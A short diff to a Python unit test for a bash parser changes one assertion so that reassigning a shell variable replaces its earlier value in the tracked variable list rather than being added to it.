@@ -114,7 +114,7 @@ class TestVariables(TestCase):
         self.assertTrue({'a':['3']} == new_var_list)
         node = bashparser.parse('a=4')[0]
         new_var_list = update_variable_list(node, new_var_list)
-        self.assertTrue({'a':['3', '4']} == new_var_list)
+        self.assertTrue({'a':['4']} == new_var_list)
     
 
     def test_update_var_list_with_for_loop(self):
